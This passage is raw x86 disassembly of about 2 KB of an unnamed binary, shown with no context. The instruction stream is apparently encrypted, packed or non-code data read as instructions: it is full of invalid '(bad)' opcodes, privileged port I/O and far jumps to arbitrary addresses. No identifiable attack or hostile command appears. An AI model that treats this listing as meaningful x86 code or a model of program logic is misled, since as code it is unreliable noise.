  414c22:	and    edx,DWORD PTR [ebx-0x2c]
  414c25:	fwait
  414c26:	mov    ecx,0x3073ed6c
  414c2b:	mov    ebx,0xc6047d79
  414c30:	xchg   ebx,eax
  414c31:	(bad)  
  414c32:	push   0xa1752671
  414c37:	xor    DWORD PTR [edx+0xb],esi
  414c3a:	xor    eax,ebx
  414c3c:	mov    edi,0x95f0b84
  414c41:	xchg   ecx,eax
  414c42:	mov    ebx,0xb72e9f20
  414c47:	and    ecx,DWORD PTR [edx+esi*2-0x3d]
  414c4b:	lds    esi,FWORD PTR [ebx]
  414c4d:	push   esi
  414c4e:	adc    BYTE PTR [eax-0x2a2dccb9],ah
  414c54:	mul    BYTE PTR [edx]
  414c56:	pushf  
  414c57:	lds    ecx,FWORD PTR [edi]
  414c59:	mov    cl,0xa2
  414c5b:	fadd   st,st(2)
  414c5d:	push   eax
  414c5e:	inc    edx
  414c5f:	xchg   edx,eax
  414c60:	fsub   QWORD PTR [ecx-0x4e]
  414c63:	lahf   
  414c64:	push   es
  414c65:	add    eax,0x9f1aaa3c
  414c6a:	cmc    
  414c6b:	mov    eax,ds:0x78097fcc
  414c70:	and    BYTE PTR [edx+0x4a],bl
  414c73:	test   ah,0x1
  414c76:	xchg   edi,eax
  414c77:	xor    eax,0x19ac8077
  414c7c:	sbb    DWORD PTR [edi-0x47],ecx
  414c7f:	sbb    al,0x84
  414c81:	push   edx
  414c82:	jmp    0x414c7d
  414c84:	push   0x8de7364f
  414c89:	scas   ax,WORD PTR es:[edi]
  414c8b:	sub    al,0xdf
  414c8d:	or     esp,eax
  414c8f:	add    dl,BYTE PTR [ebp-0x475b69aa]
  414c95:	sub    dl,BYTE PTR [eax+0x3e]
  414c98:	scas   eax,DWORD PTR es:[edi]
  414c99:	push   edx
  414c9a:	leave  
  414c9b:	jp     0x414c8c
  414c9d:	mov    DWORD PTR [esi],ebx
  414c9f:	sar    DWORD PTR es:[esp],1
  414ca3:	sbb    eax,0xf655c693
  414ca8:	xchg   ebp,eax
  414ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414caa:	out    0x4,al
  414cac:	(bad)  
  414cae:	repz add ebx,eax
  414cb1:	push   0x55
  414cb3:	frstor [esi]
  414cb5:	add    edx,ecx
  414cb7:	outs   dx,DWORD PTR ds:[esi]
  414cb8:	and    dl,bl
  414cba:	rcr    BYTE PTR [esi],cl
  414cbc:	pop    esi
  414cbd:	and    al,0xdb
  414cbf:	mov    dl,0xf9
  414cc1:	add    edx,DWORD PTR [esi]
  414cc3:	mov    al,ds:0xb02cf7
  414cc8:	arpl   WORD PTR [ebx],sp
  414cca:	bound  esp,QWORD PTR [ecx]
  414ccc:	stc    
  414ccd:	xor    al,0x85
  414ccf:	mov    dh,BYTE PTR [ecx*2-0x9a7a70d]
  414cd6:	ins    BYTE PTR es:[edi],dx
  414cd7:	push   0xfc152c16
  414cdc:	mov    al,0xfc
  414cde:	and    edx,DWORD PTR ds:0x62d5921
  414ce4:	cmp    al,0x8d
  414ce6:	push   ebx
  414ce7:	xchg   ecx,eax
  414ce8:	pushf  
  414ce9:	fcomp  QWORD PTR [eax-0x34e495d1]
  414cef:	cli    
  414cf0:	sar    DWORD PTR [ecx+ebx*4],0x98
  414cf4:	inc    ebp
  414cf5:	into   
  414cf6:	test   al,0xe4
  414cf8:	das    
  414cf9:	mov    cl,0x7
  414cfb:	mov    ebp,0xe6518103
  414d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d01:	(bad)  
  414d02:	add    al,0xa6
  414d04:	dec    ecx
  414d05:	cmc    
  414d06:	(bad)  
  414d07:	xchg   edx,eax
  414d08:	scas   eax,DWORD PTR es:[edi]
  414d09:	fwait
  414d0a:	mov    dh,BYTE PTR [edi+0x17c6d2ca]
  414d10:	enter  0xf3ac,0xae
  414d14:	pop    ds
  414d15:	dec    edx
  414d16:	aam    0x2e
  414d18:	push   0xe01af24b
  414d1d:	das    
  414d1e:	fstp   st(1)
  414d20:	pop    edx
  414d21:	hlt    
  414d22:	sub    DWORD PTR [ecx+0x69],edi
  414d25:	jle    0x414cd6
  414d27:	arpl   si,bx
  414d29:	jmp    0xea34:0x2c984c99
  414d30:	pop    ecx
  414d31:	mov    WORD PTR [edi+0x64bdbb3f],ss
  414d37:	(bad)  
  414d38:	mov    gs,WORD PTR [edx+edx*8-0x41a974dc]
  414d3f:	mov    eax,0x6bcb13bd
  414d44:	xchg   edx,eax
  414d45:	cmc    
  414d46:	jo     0x414d4d
  414d48:	in     al,dx
  414d49:	cs hlt 
  414d4b:	adc    edx,DWORD PTR [edx]
  414d4d:	xor    al,0x4
  414d4f:	ds repnz pop esp
  414d52:	mov    ?,WORD PTR [ecx-0x1a]
  414d55:	js     0x414d7d
  414d57:	adc    ch,dl
  414d59:	cmp    DWORD PTR [edi],ecx
  414d5b:	mov    dl,0x50
  414d5d:	and    al,al
  414d5f:	add    bl,bl
  414d61:	mov    cl,0xb9
  414d63:	pop    ecx
  414d64:	out    dx,eax
  414d65:	imul   ebx,DWORD PTR [esi],0x35a596a8
  414d6b:	lahf   
  414d6c:	test   eax,0xc3931113
  414d71:	test   eax,0x19d7556a
  414d76:	or     ch,BYTE PTR [ebx-0x15f38bca]
  414d7c:	pushf  
  414d7d:	xchg   BYTE PTR [ecx-0x39d2aa7f],cl
  414d83:	add    dl,dh
  414d85:	add    eax,0x1b74895a
  414d8a:	ss stos BYTE PTR es:[edi],al
  414d8c:	xchg   esp,eax
  414d8d:	enter  0x627e,0xc3
  414d91:	jnp    0x414de0
  414d93:	gs mov esi,0x29930daf
  414d99:	push   eax
  414d9a:	xchg   edx,eax
  414d9b:	fisttp QWORD PTR [eax+0x7cf7570]
  414da1:	std    
  414da2:	cmp    edi,DWORD PTR [edx+ecx*4]
  414da5:	lds    eax,FWORD PTR [ecx-0x5c578cc5]
  414dab:	fisubr DWORD PTR [esi]
  414dad:	gs std 
  414daf:	fcmovu st,st(1)
  414db1:	out    0x43,al
  414db3:	std    
  414db4:	jmp    0x9fbe13b3
  414db9:	lods   al,BYTE PTR ds:[esi]
  414dba:	lahf   
  414dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbc:	or     al,0xfc
  414dbe:	mov    dh,0x74
  414dc0:	fcomp  DWORD PTR [edi-0x49dbfc5a]
  414dc6:	nop
  414dc7:	mov    bl,0x6
  414dc9:	inc    ecx
  414dca:	adc    ch,BYTE PTR [ecx]
  414dcc:	xchg   ecx,esp
  414dce:	test   BYTE PTR [esi+0x43bcd008],dl
  414dd4:	(bad)  
  414dd5:	pop    ds
  414dd6:	lds    ebx,FWORD PTR [edx]
  414dd8:	xor    eax,DWORD PTR [ebx-0x29c697fd]
  414dde:	daa    
  414ddf:	pop    edi
  414de0:	mov    esp,0xaaddcdb2
  414de5:	xor    BYTE PTR [ecx],0x35
  414de8:	sahf   
  414de9:	adc    al,0xed
  414deb:	and    eax,0xde2650fb
  414df0:	popa   
  414df1:	call   0x4b6df957
  414df6:	mov    eax,0x3bf45efd
  414dfb:	dec    eax
  414dfc:	(bad)  
  414dfd:	jle    0x414e77
  414dff:	bound  edx,QWORD PTR [ecx+0x7]
  414e02:	imul   eax,ecx,0xffffff93
  414e05:	inc    BYTE PTR [ebx]
  414e07:	nop
  414e08:	test   DWORD PTR [edx+0x6619001a],esp
  414e0e:	dec    ebp
  414e0f:	sbb    dl,bl
  414e11:	pop    ebp
  414e12:	pop    ebp
  414e13:	sti    
  414e14:	out    0x7d,al
  414e16:	sahf   
  414e17:	xor    ah,bh
  414e19:	stos   BYTE PTR es:[edi],al
  414e1a:	mov    eax,ds:0x2c70160
  414e1f:	bound  ecx,QWORD PTR [edx-0x5]
  414e22:	mov    eax,ds:0x70aa18d0
  414e27:	and    DWORD PTR [edi-0x7b158ca3],eax
  414e2d:	push   ebx
  414e2e:	ins    BYTE PTR es:[edi],dx
  414e2f:	inc    esi
  414e30:	jmp    0x414dc1
  414e32:	mov    eax,edi
  414e34:	mov    ds:0xdbd05189,al
  414e39:	jp     0x414dbf
  414e3b:	xor    al,0x1f
  414e3d:	add    edx,esp
  414e3f:	mov    ds:0x12296ac7,eax
  414e44:	xchg   esp,eax
  414e45:	ror    DWORD PTR [esi+0x6ce1133a],cl
  414e4b:	retf   
  414e4c:	mov    ds:0x957fd0a8,eax
  414e51:	test   eax,0x53d337d2
  414e56:	sub    dh,ah
  414e58:	push   0x41
  414e5a:	cwde   
  414e5b:	lds    ebx,FWORD PTR [eax+0x9]
  414e5e:	adc    eax,DWORD PTR [eax-0x5f2830cb]
  414e64:	mov    cs,WORD PTR [edx]
  414e66:	and    ebp,DWORD PTR [edi-0x263c0dd1]
  414e6c:	cld    
  414e6d:	sti    
  414e6e:	or     BYTE PTR [ebp-0x2b],cl
  414e71:	mov    cl,0x2a
  414e73:	sbb    bl,dl
  414e75:	push   ecx
  414e76:	mov    ds:0x6e45b9bc,al
  414e7b:	call   0xd1dc:0x5fb90de6
  414e82:	lahf   
  414e83:	ror    DWORD PTR [ecx-0x47],1
  414e86:	aad    0x99
  414e88:	mov    al,ss:0x1b1a8093
  414e8e:	(bad)  
  414e8f:	shr    DWORD PTR [ebp+0x3ff3a042],1
  414e95:	pop    edi
  414e96:	pop    ebx
  414e97:	add    DWORD PTR [ebp-0x47dd1f8e],ebx
  414e9d:	leavew 
  414e9f:	xor    al,0x8c
  414ea1:	sbb    DWORD PTR [esi-0x2b],edi
  414ea4:	fiadd  WORD PTR [edi]
  414ea6:	lods   al,BYTE PTR ds:[esi]
  414ea7:	imul   ebx,DWORD PTR [eax+0x7d],0x1c
  414eab:	push   edi
  414eac:	call   0x5ae7:0x82045b8a
  414eb3:	xchg   DWORD PTR ds:[ebx-0x7b416ef6],edx
  414eba:	call   0x9d798720
  414ebf:	out    dx,eax
  414ec0:	(bad)  
  414ec1:	push   ebp
  414ec2:	pop    edx
  414ec3:	call   0xc0f3:0x76500ab5
  414eca:	push   eax
  414ecb:	nop
  414ecc:	les    edi,FWORD PTR [edi]
  414ece:	mov    esi,0xcf6bad86
  414ed3:	and    edi,DWORD PTR [ecx]
  414ed5:	push   esp
  414ed6:	pop    esp
  414ed7:	add    al,0x37
  414ed9:	sar    dh,0x5a
  414edc:	jae    0x414e74
  414ede:	jno    0x414f3d
  414ee0:	das    
  414ee1:	push   0xffffffca
  414ee3:	rcr    BYTE PTR [eax-0x16e99788],1
  414ee9:	fs push eax
  414eeb:	lahf   
  414eec:	inc    edx
  414eed:	mov    eax,ds:0xae405b20
  414ef2:	mov    bh,0x4a
  414ef4:	mov    WORD PTR [eax+ecx*4+0x87381c0],gs
  414efb:	or     esi,DWORD PTR [ecx-0x21e5a3ff]
  414f01:	and    eax,0xf27e12f7
  414f06:	push   ebp
  414f07:	out    0x4e,eax
  414f09:	jp     0x414f5d
  414f0b:	cld    
  414f0c:	or     bh,BYTE PTR [esi+0x447a0a8e]
  414f12:	jp     0x414f70
  414f14:	mov    DWORD PTR [ebp-0x26163751],eax
  414f1a:	jmp    0x2bfd2162
  414f1f:	mov    dl,0xdf
  414f21:	xor    eax,DWORD PTR [edi-0x33]
  414f24:	jo     0x414ee5
  414f26:	ret    0x4402
  414f29:	fs fs pop edi
  414f2c:	push   ds
  414f2d:	jb     0x414f4c
  414f2f:	add    dh,ah
  414f31:	dec    ebp
  414f32:	aaa    
  414f33:	mov    ecx,0xb2aeee37
  414f38:	in     eax,dx
  414f39:	iret   
  414f3a:	inc    eax
  414f3b:	fcom   QWORD PTR [edx-0x19]
  414f3e:	jmp    0x5b7f:0x104c644d
  414f45:	fwait
  414f46:	outs   dx,BYTE PTR ds:[esi]
  414f47:	sbb    ah,BYTE PTR [ecx-0x62]
  414f4a:	cmp    cl,dl
  414f4c:	inc    edx
  414f4d:	rcr    DWORD PTR [ebx],cl
  414f4f:	js     0x414f66
  414f51:	pusha  
  414f52:	fsub   DWORD PTR [eax+edi*2-0x10]
  414f56:	push   edx
  414f57:	test   al,0xb
  414f59:	inc    ecx
  414f5a:	rol    DWORD PTR [eax+0x1ed5811e],cl
  414f60:	mov    ebx,0xafff17b1
  414f65:	jmp    0x3055:0x894acc9
  414f6c:	mov    edx,0xa11faee0
  414f71:	jg     0x414f9f
  414f73:	jb     0x414f6b
  414f75:	mov    dh,0xc5
  414f77:	mov    esp,0x5155f6b1
  414f7c:	sbb    BYTE PTR [esi+0x34],dh
  414f7f:	mov    esp,0x389fba99
  414f84:	push   ecx
  414f85:	mov    ch,0x7c
  414f87:	mov    DWORD PTR [edx-0x303e2d31],0xa72ebaa3
  414f91:	mov    ds:0x4acbdb0d,eax
  414f96:	mov    ecx,0xd6335ce
  414f9b:	pop    ecx
  414f9c:	jae    0x414f27
  414f9e:	fcmovb st,st(5)
  414fa0:	ret    
  414fa1:	dec    esi
  414fa2:	sub    BYTE PTR [esi+0x69],0xde
  414fa6:	repnz lock add bl,BYTE PTR [ebp+0x1007e7a4]
  414fae:	lods   eax,DWORD PTR ds:[esi]
  414faf:	xchg   edi,eax
  414fb0:	xlat   BYTE PTR ds:[ebx]
  414fb1:	sub    DWORD PTR [ebp+0x4c25797b],edi
  414fb7:	xchg   ebp,eax
  414fb8:	mov    esi,0xe52ed924
  414fbd:	lods   al,BYTE PTR ds:[esi]
  414fbe:	mov    bl,0x1b
  414fc0:	xor    BYTE PTR [esi],ch
  414fc2:	imul   ebp,DWORD PTR [ecx+0xd],0xffffffe5
  414fc6:	bound  ebx,QWORD PTR [edi+0x61c3067d]
  414fcc:	test   eax,0xda9b6099
  414fd1:	xchg   BYTE PTR [ebx],dl
  414fd3:	adc    al,0xbd
  414fd5:	daa    
  414fd6:	sub    DWORD PTR [eax+0x6e],ebp
  414fd9:	int3   
  414fda:	mov    ds:0xead0143a,eax
  414fdf:	arpl   WORD PTR [ecx+0x3e],dx
  414fe2:	pop    ecx
  414fe3:	(bad)  
  414fe5:	pop    esi
  414fe6:	mov    dh,0x29
  414fe8:	pop    edi
  414fe9:	jae    0x414f76
  414feb:	push   ds
  414fec:	sbb    ebx,DWORD PTR [ebx+0x1fbafb6f]
  414ff2:	sbb    DWORD PTR [edx+0x1c5efa40],edi
  414ff8:	push   ds
  414ff9:	or     al,cl
  414ffb:	mov    ebx,0x9f073727
  415000:	popf   
  415001:	sub    eax,0x6ba6eb73
  415006:	das    
  415007:	aam    0x2d
  415009:	mov    BYTE PTR [edi+0x432b4daa],bl
  41500f:	retf   
  415010:	xchg   ebp,eax
  415011:	and    eax,0x3bcf9c67
  415016:	neg    BYTE PTR [ebx]
  415018:	rcr    ch,0xe7
  41501b:	fild   QWORD PTR [ebp-0x6f163c15]
  415021:	retf   0xa0f5
  415024:	cdq    
  415025:	call   DWORD PTR [ebp+0x5]
  415028:	mov    gs,WORD PTR [edi+0x28bbbbb0]
  41502e:	push   esi
  41502f:	int3   
  415030:	cmp    cl,ch
  415032:	fisub  WORD PTR [ebp-0x3eef5d67]
  415038:	mov    eax,0x56bb101f
  41503d:	or     esp,ebx
  41503f:	fcmovnu st,st(2)
  415041:	lahf   
  415042:	dec    edi
  415043:	rcr    DWORD PTR [edi+0x1],1
  415046:	push   ds
  415047:	jmp    0x9717:0xc27fec85
  41504e:	loope  0x415099
  415050:	sar    bl,0x1e
  415053:	add    DWORD PTR [esi+0x2b8d5904],edi
  415059:	ror    BYTE PTR [ecx-0x7e1e46d9],1
  41505f:	popa   
  415060:	mov    gs,WORD PTR [ecx]
  415062:	ret    
  415063:	pop    esi
  415064:	fidiv  DWORD PTR [edx+0x3ff58e4f]
  41506a:	adc    al,BYTE PTR [ebp+esi*8+0x1fb662a8]
  415071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415072:	jp     0x4150ba
  415074:	mov    DWORD PTR [ebp+0x70],esp
  415077:	(bad)  
  415078:	xsavec [edi+0x47]
  41507c:	in     al,0x20
  41507e:	into   
  41507f:	out    dx,eax
  415080:	(bad)  
  415081:	leave  
  415082:	ret    
  415083:	push   ss
  415084:	and    ebp,DWORD PTR [edi+0x1b]
  415087:	out    0x2f,eax
  415089:	pop    eax
  41508a:	pusha  
  41508b:	jnp    0x41500f
  41508d:	ins    BYTE PTR es:[edi],dx
  41508e:	(bad)  
  415090:	adc    DWORD PTR [esi],ebx
  415092:	mov    esi,0x96eef922
  415097:	bound  ecx,QWORD PTR [esi]
  415099:	pop    ds
  41509a:	mov    ch,0x60
  41509c:	add    ecx,DWORD PTR [ecx+0x6c]
  41509f:	mov    esp,0x64791578
  4150a4:	in     al,dx
  4150a5:	lock outs dx,BYTE PTR ds:[esi]
  4150a8:	pop    edx
  4150a9:	loope  0x415116
  4150ab:	lods   al,BYTE PTR ds:[esi]
  4150ac:	push   edx
  4150ad:	fcomp  QWORD PTR [ecx-0x46]
  4150b0:	ja     0x415068
  4150b2:	imul   esp,esp,0x1ebd9820
  4150b8:	bound  eax,QWORD PTR [ecx]
  4150ba:	jp     0x4150a7
  4150bc:	sub    esi,DWORD PTR [edi]
  4150be:	in     eax,dx
  4150bf:	loop   0x4150b0
  4150c1:	pop    eax
  4150c2:	mov    bh,0x90
  4150c4:	add    eax,0x46fafc33
  4150c9:	out    0x2a,al
  4150cb:	adc    eax,0xaee6c4e7
  4150d0:	mov    esi,esi
  4150d2:	sub    DWORD PTR [ebx+0x15],edi
  4150d5:	imul   dh
  4150d7:	sbb    eax,0x26d6d4f4
  4150dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150dd:	push   DWORD PTR [ebx]
  4150df:	into   
  4150e0:	mov    al,0xa4
  4150e2:	rcl    DWORD PTR [ecx-0x266da10c],cl
  4150e8:	shr    ebx,cl
  4150ea:	push   ecx
  4150eb:	arpl   WORD PTR [edi],sp
  4150ed:	mov    bl,0x9e
  4150ef:	gs add eax,0xa2730c4f
  4150f5:	lahf   
  4150f6:	cmp    eax,0xdf7ddda0
  4150fb:	sbb    eax,0x53fb0501
  415100:	cmovae ebx,DWORD PTR [eax-0x3e2fccc0]
  415107:	mov    ah,0x50
  415109:	fs ins BYTE PTR es:[edi],dx
  41510b:	dec    ebx
  41510c:	scas   ax,WORD PTR es:[edi]
  41510e:	hlt    
  41510f:	push   ecx
  415110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415111:	daa    
  415112:	cwde   
  415113:	inc    esi
  415114:	mov    ds:0x18803ca,al
  415119:	lods   al,BYTE PTR ds:[esi]
  41511a:	xor    ebp,edx
  41511c:	adc    eax,0x9055dceb
  415121:	jmp    0x564af3df
  415126:	xor    BYTE PTR [esi-0x41],ch
  415129:	add    DWORD PTR [ecx+0xb3180ab],ecx
  41512f:	retf   
  415130:	inc    edi
  415131:	popa   
  415132:	stos   BYTE PTR es:[edi],al
  415133:	mul    BYTE PTR ds:[eax-0x4b]
  415137:	cmp    cl,BYTE PTR [ebx]
  415139:	or     eax,DWORD PTR [esi]
  41513b:	out    0x79,al
  41513d:	dec    sp
  41513f:	arpl   WORD PTR [edi+0x5b],sp
  415142:	nop
  415143:	in     eax,0xf0
  415145:	inc    edi
  415146:	ds or  al,0xf8
  415149:	mov    bh,bh
  41514b:	add    al,0xa2
  41514d:	and    BYTE PTR [edx-0x4231e8f0],ch
  415153:	inc    esi
  415154:	pop    ds
  415155:	shl    BYTE PTR [esi],0xb4
  415158:	jno    0x4150da
  41515a:	test   DWORD PTR [ecx+0x40],ecx
  41515d:	push   0x46b83fdc
  415162:	mov    DWORD PTR ds:0x205d6e34,esp
  415168:	ret    0x5c28
  41516b:	rcr    DWORD PTR [eax-0x32ce40be],1
  415171:	xchg   BYTE PTR [edi+ecx*1-0xd],bl
  415175:	push   edi
  415176:	and    BYTE PTR [ebx-0x76],ah
  415179:	clc    
  41517a:	sbb    edi,0xffffffb1
  41517d:	call   FWORD PTR [eax+ebx*8]
  415180:	cdq    
  415181:	add    ecx,DWORD PTR [ecx-0x61f0e790]
  415187:	xchg   edx,eax
  415188:	add    al,0xdc
  41518a:	jmp    0x4151cc
  41518c:	cld    
  41518d:	outs   dx,DWORD PTR ds:[esi]
  41518e:	nop    DWORD PTR [ebx]
  415191:	mov    cl,0xf3
  415193:	cwde   
  415194:	nop
  415195:	cdq    
  415196:	div    DWORD PTR [esi+ecx*2+0x39]
  41519a:	cmc    
  41519b:	add    DWORD PTR [esi],esi
  41519d:	or     BYTE PTR [eiz*1-0x2843a178],ah
  4151a4:	inc    ebp
  4151a5:	(bad)  
  4151a6:	push   ebx
  4151a7:	xchg   ebp,eax
  4151a8:	mov    bh,0xb4
  4151aa:	pop    esp
  4151ab:	sbb    esp,DWORD PTR [ecx]
  4151ad:	imul   esp,DWORD PTR [ebp-0x2eb6a6ae],0x14340f46
  4151b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151b8:	mov    esi,0x77c70ceb
  4151bd:	aad    0x3b
  4151bf:	and    eax,0x7e1a1b46
  4151c4:	stos   BYTE PTR es:[edi],al
  4151c5:	add    esi,DWORD PTR ds:0xcfc9b63d
  4151cb:	in     eax,0x29
  4151cd:	push   0xffffffd6
  4151cf:	int3   
  4151d0:	dec    ebx
  4151d1:	(bad)  
  4151d2:	xor    ah,BYTE PTR [esi+0x38]
  4151d5:	in     eax,0x9a
  4151d7:	jne    0x4151a9
  4151d9:	lds    esi,FWORD PTR [ebp-0x74c118ca]
  4151df:	mov    esi,0x5ea3d888
  4151e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151e5:	mov    al,ds:0x6cc4f177
  4151ea:	push   edi
  4151eb:	stos   DWORD PTR es:[edi],eax
  4151ec:	loope  0x4151da
  4151ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151ef:	sub    ebp,DWORD PTR [ebx-0x32]
  4151f2:	sub    BYTE PTR [ebp+edx*1+0x37028514],ch
  4151f9:	xchg   BYTE PTR ds:0xc776c279,dh
  4151ff:	into   
  415200:	sbb    DWORD PTR [ecx+eiz*4+0x30],ecx
  415204:	adc    eax,0x19b7ddce
  415209:	test   al,0xb1
  41520b:	cmp    esi,ebp
  41520d:	adc    BYTE PTR [esp+esi*8+0x72],al
  415211:	je     0x4151f6
  415213:	inc    ecx
  415214:	cmp    esi,DWORD PTR [esi]
  415216:	mov    edx,0xc98bf4c6
  41521b:	mov    dl,BYTE PTR [edi+0x7175e53d]
  415221:	adc    DWORD PTR [ebx-0x7c],edi
  415224:	sub    BYTE PTR [ecx+0x5607b4d4],bh
  41522a:	jo     0x41525e
  41522c:	dec    edi
  41522d:	jbe    0x415236
  41522f:	pop    eax
  415230:	push   esp
  415231:	stos   DWORD PTR es:[edi],eax
  415232:	mov    edi,DWORD PTR [ebx]
  415234:	jmp    0xfdd377ef
  415239:	outs   dx,BYTE PTR ds:[esi]
  41523a:	popa   
  41523b:	outs   dx,BYTE PTR ds:[esi]
  41523c:	dec    edi
  41523d:	fdivr  DWORD PTR [edi-0x5d37e740]
  415243:	rcl    DWORD PTR [esi],cl
  415245:	imul   eax,DWORD PTR [edi-0x75036f56],0xb93d4f2d
  41524f:	out    0x61,al
  415251:	pop    eax
  415252:	push   0x32a5074c
  415257:	inc    eax
  415258:	push   esp
  415259:	stos   BYTE PTR es:[edi],al
  41525a:	outs   dx,DWORD PTR ds:[esi]
  41525b:	pop    ebx
  41525c:	jl     0x4152ba
  41525e:	adc    BYTE PTR [ecx-0x6cafdca9],ch
  415264:	out    0x51,al
  415266:	arpl   WORD PTR es:[eax],bx
  415269:	in     al,0xb4
  41526b:	push   ds
  41526c:	inc    ecx
  41526d:	mov    bh,0x88
  41526f:	xchg   BYTE PTR [eax],dl
  415271:	inc    ecx
  415272:	jo     0x4152cd
  415274:	nop
  415275:	mov    ds:0xeb4f217f,al
  41527a:	mov    ebp,0x2080909f
  41527f:	es into 
  415281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415282:	mov    edx,0xb0705b4a
  415287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415288:	mov    ch,0x95
  41528a:	xchg   edi,eax
  41528b:	outs   dx,BYTE PTR ds:[esi]
  41528c:	scas   al,BYTE PTR es:[edi]
  41528d:	mov    ah,0x71
  41528f:	aad    0x67
  415291:	pusha  
  415292:	ja     0x415295
  415294:	fsubr  st,st(6)
  415296:	jae    0x41530e
  415298:	cmc    
  415299:	cld    
  41529a:	xor    DWORD PTR [edx-0x30],ebp
  41529d:	jge    0x41525f
  41529f:	mov    edi,0x5fe3be78
  4152a4:	push   0x60b5d33e
  4152a9:	mov    esi,0x6cc5cdf8
  4152ae:	adc    ebp,DWORD PTR [eax+eax*1-0x80d57d5]
  4152b5:	int3   
  4152b6:	push   ebx
  4152b7:	sbb    BYTE PTR [edx],ah
  4152b9:	test   eax,0xae02e511
  4152be:	dec    edi
  4152bf:	xchg   ebp,eax
  4152c0:	dec    esi
  4152c1:	sahf   
  4152c2:	shl    DWORD PTR [ebx-0x2c31a70c],cl
  4152c8:	jo     0x415327
  4152ca:	loopne 0x41528d
  4152cc:	pop    eax
  4152cd:	adc    al,BYTE PTR [eax-0x2]
  4152d0:	jl     0x4152ed
  4152d2:	mov    bl,0x40
  4152d4:	mov    ds:0xbb8b7897,al
  4152d9:	in     eax,dx
  4152da:	sti    
  4152db:	loopne 0x415271
  4152dd:	mov    eax,0x8ba60a3e
  4152e2:	jne    0x4152a6
  4152e4:	inc    esp
  4152e5:	int    0x74
  4152e7:	(bad)  
  4152e8:	lock xchg DWORD PTR ds:0x39110d3e,esp
  4152ef:	aas    
  4152f0:	outs   dx,BYTE PTR gs:[esi]
  4152f2:	xchg   ebp,eax
  4152f3:	or     edx,DWORD PTR [ebx+ebp*2]
  4152f6:	sub    ebx,esi
  4152f8:	je     0x4152b2
  4152fa:	pop    ds
  4152fb:	(bad)  
  4152fc:	xor    DWORD PTR [edi-0x1a],ebx
  4152ff:	sub    ch,BYTE PTR [ebx]
  415301:	imul   ebx,ecx,0xffffffb1
  415304:	aaa    
  415305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415306:	nop
  415307:	lea    eax,[ebx-0x1b]
  41530a:	ds inc eax
  41530c:	(bad)  
  41530d:	inc    esi
  41530e:	push   0x46
  415310:	hlt    
  415311:	mov    edi,0x36324d66
  415316:	mov    eax,0x350d530e
  41531b:	sbb    DWORD PTR [esi-0x19702b85],eax
  415321:	int    0x38
  415323:	mov    ecx,DWORD PTR [ecx-0x5b]
  415326:	pusha  
  415327:	and    ebp,0xffffff95
  41532a:	xchg   DWORD PTR [eax],eax
  41532c:	add    BYTE PTR [ebx+0x4da1febb],ch
  415332:	pop    ss
  415333:	in     al,dx
  415334:	jmp    0x41539a
  415336:	lea    edx,[ecx+0x73]
  415339:	mov    BYTE PTR [ebx-0x6e],bh
  41533c:	bound  ebp,QWORD PTR [eax+0x5c892bbd]
  415342:	imul   edi,DWORD PTR [edi-0x39],0xef5b34b6
  415349:	shr    cl,1
  41534b:	dec    esi
  41534c:	inc    esp
  41534d:	mov    bl,0xc1
  41534f:	mov    esi,?
  415351:	sbb    BYTE PTR [edx+0x615447c4],0x4d
  415358:	and    edi,edi
  41535a:	fimul  DWORD PTR [eax+0x6508ab0]
  415360:	shr    ebx,0xa5
  415363:	sti    
  415364:	dec    ebp
  415365:	gs out 0x29,al
  415368:	sti    
  415369:	jl     0x415399
  41536b:	ds sar dh,1
  41536e:	inc    edx
  41536f:	push   cs
  415370:	push   0x60
  415372:	sahf   
  415373:	mov    ch,0xc2
  415375:	in     eax,dx
  415376:	xchg   esi,eax
  415377:	stos   BYTE PTR es:[edi],al
  415378:	sbb    esi,DWORD PTR [edi-0x39943d26]
  41537e:	dec    esp
  41537f:	push   es
  415380:	int3   
  415381:	xchg   esp,eax
  415382:	cmp    ecx,DWORD PTR [edx-0x43eaeac0]
  415388:	adc    BYTE PTR [ecx-0x11],dl
  41538b:	es das 
  41538d:	ins    DWORD PTR es:[edi],dx
  41538e:	mov    ds:0xbd3993c5,al
  415393:	adc    DWORD PTR [ebx],esp
  415395:	push   0x6aca97dc
  41539a:	lea    ecx,[esi-0x6a]
  41539d:	nop
  41539e:	pop    edi
  41539f:	test   eax,0xf5adc292
  4153a4:	cli    
  4153a5:	mov    ah,0xa
  4153a7:	out    dx,eax
  4153a8:	cs and esi,edx
  4153ab:	xchg   esp,eax
  4153ac:	std    
  4153ad:	int    0x13
  4153af:	adc    eax,DWORD PTR [eax]
  4153b1:	scas   eax,DWORD PTR es:[edi]
  4153b2:	dec    ecx
  4153b3:	cdq    
  4153b4:	ss or  al,0x89
  4153b7:	rcl    DWORD PTR [eax+0x0],1
  4153ba:	lock rcr BYTE PTR [eax-0x223405e4],cl
  4153c1:	mov    BYTE PTR [esp+ecx*8+0x6c],dh
  4153c5:	arpl   WORD PTR [eax],di
  4153c7:	popa   
  4153c8:	xor    DWORD PTR gs:[edi+0x1d],ebp
  4153cc:	int3   
  4153cd:	and    eax,0x76213a42
  4153d2:	jbe    0x41538e
  4153d4:	inc    esi
  4153d5:	pop    ss
  4153d6:	mov    BYTE PTR [esi-0x39cd5349],ah
  4153dc:	cmp    ah,BYTE PTR [edx+0x8]
  4153df:	shl    ecx,1
  4153e1:	and    DWORD PTR [eax-0x24],ecx
  4153e4:	outs   dx,BYTE PTR ds:[esi]
  4153e5:	xchg   edi,eax
  4153e6:	cmp    eax,0x407a13d
  4153eb:	xor    DWORD PTR [edx-0x5f549b2],esp
  4153f1:	xchg   ecx,eax
  4153f2:	das    
  4153f3:	test   al,0x70
  4153f5:	pop    eax
  4153f6:	sbb    ecx,DWORD PTR [edx]
  4153f8:	test   al,0x9b
  4153fa:	jp     0x4153ec
  4153fc:	pop    ss
